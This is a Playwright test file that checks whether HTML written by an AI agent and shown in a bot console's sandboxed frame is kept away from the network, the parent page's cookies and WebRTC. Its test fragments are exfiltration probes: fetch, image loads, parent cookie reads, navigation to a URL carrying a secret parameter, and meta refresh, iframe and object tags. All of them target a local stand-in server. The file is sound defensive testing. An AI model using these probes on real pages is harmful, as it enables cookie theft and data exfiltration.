import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { expect, test } from '@playwright/test';
import { insertBotActivity } from '../../support/db';
import { provisionedUser, signInAs } from '../../support/web';

/**
 * HTML an agent wrote, run in the console against the real API and its
 * visuals page. What breaks this: the fragment reaching the network (a
 * fetch, an image, its own frame navigated to another site, which also put
 * that site's page in the chat), reaching the console's page or cookies, or
 * keeping WebRTC, the one way out a CSP does not close. A server stands in
 * for the outside: nothing may reach it.
 */

let outside: Server;
let outsideUrl = '';
const hits: string[] = [];
/** Connections opened to the outside, a request on them or not: a browser's preconnect counts. */
let connections = 0;

test.beforeAll(async () => {
  outside = createServer((req, res) => {
    hits.push(req.url ?? '');
    res.setHeader('access-control-allow-origin', '*');
    res.end('<h1>OUTSIDE</h1>');
  });
  outside.on('connection', () => {
    connections += 1;
  });
  await new Promise<void>((resolve) => outside.listen(0, '127.0.0.1', resolve));
  outsideUrl = `http://127.0.0.1:${(outside.address() as AddressInfo).port}`;
});

test.afterAll(() => new Promise<void>((resolve) => outside.close(() => resolve())));

async function botWithHtml(html: string) {
  const owner = await provisionedUser('visualframe');
  await owner.api.put('/api/v1/model-providers/glm', { data: { apiKey: 'e2e-placeholder' } });
  const bot = (await (
    await owner.api.post('/api/v1/bots', { data: { name: 'Frame Bro', provider: 'glm' } })
  ).json()) as { id: string };
  await insertBotActivity(bot.id, [
    {
      callId: 'v',
      name: 'show_visual',
      input: {},
      output: 'Shown to the person.',
      isError: false,
      sessionId: null,
      subagents: null,
      allowedBy: null,
      mailDraft: null,
      rateLimit: null,
      visual: { title: 'Probe', blocks: [{ type: 'html', html }] },
    },
  ]);
  return { owner, bot };
}

test('a visual’s HTML runs, but reaches neither the network nor the console', async ({ page }) => {
  hits.length = 0;
  const { owner, bot } = await botWithHtml(`<p id="out">running</p><script>
    const out = {};
    const done = (name, value) => { out[name] = value; document.getElementById('out').textContent = JSON.stringify(out); };
    fetch('${outsideUrl}/fetch').then(() => done('fetch', 'reached'), () => done('fetch', 'refused'));
    const img = new Image(); img.onload = () => done('image', 'reached'); img.onerror = () => done('image', 'refused'); img.src = '${outsideUrl}/image';
    try { done('parent', String(parent.document.cookie)); } catch { done('parent', 'refused'); }
    try { done('cookie', document.cookie); } catch { done('cookie', 'refused'); }
    done('webrtc', typeof RTCPeerConnection);
  </script>`);
  await signInAs(page, owner.user);
  await page.goto(`/bots/${bot.id}`);
  const frame = page.frameLocator('[data-slot="visual"] iframe').frameLocator('iframe');
  await expect(frame.locator('#out')).toContainText('"webrtc"', { timeout: 20_000 });
  await expect(frame.locator('#out')).toContainText('"fetch":"refused"');
  await expect(frame.locator('#out')).toContainText('"image":"refused"');
  const out = JSON.parse((await frame.locator('#out').textContent()) ?? '{}') as Record<
    string,
    string
  >;
  expect(out).toMatchObject({ parent: 'refused', cookie: 'refused', webrtc: 'undefined' });
  expect(hits).toEqual([]);
});

test('a visual that navigates its frame away is ended, and nothing outside is reached', async ({
  page,
}) => {
  hits.length = 0;
  const { owner, bot } = await botWithHtml(
    `<p>leaving</p><script>setTimeout(() => { location.href = '${outsideUrl}/navigated?d=secret'; }, 200);</script>`,
  );
  await signInAs(page, owner.user);
  await page.goto(`/bots/${bot.id}`);
  const card = page.locator('[data-slot="visual"]');
  // The frame is ended and its source shown in its place, folded.
  await expect(card.locator('iframe')).toHaveCount(0, { timeout: 20_000 });
  await expect(card).toContainText('Show source');
  await expect(page.getByText('OUTSIDE')).toHaveCount(0);
  expect(hits).toEqual([]);
});

// What breaks this: a frame or a refresh in the fragment, which the browser
// connects to (and looks up in DNS) before its CSP refuses the page, so a host
// name could carry data out. They are stripped before the fragment runs, and a
// frame made from script is refused.
test('a visual can open no frame and no refresh, from markup or from script', async ({ page }) => {
  hits.length = 0;
  connections = 0;
  const { owner, bot } = await botWithHtml(`<p id="out">running</p>
    <iframe src="${outsideUrl}/framed"></iframe>
    <meta http-equiv="refresh" content="0;url=${outsideUrl}/refreshed">
    <object data="${outsideUrl}/object"></object>
    <script>
      let made = 'made';
      try { document.createElement('iframe'); } catch { made = 'refused'; }
      document.getElementById('out').textContent = made + ':' + document.querySelectorAll('iframe,meta[http-equiv],object').length;
    </script>`);
  await signInAs(page, owner.user);
  await page.goto(`/bots/${bot.id}`);
  const frame = page.frameLocator('[data-slot="visual"] iframe').frameLocator('iframe');
  await expect(frame.locator('#out')).toHaveText('refused:0', { timeout: 20_000 });
  await page.waitForTimeout(1000);
  expect(hits).toEqual([]);
  expect(connections).toBe(0);
});
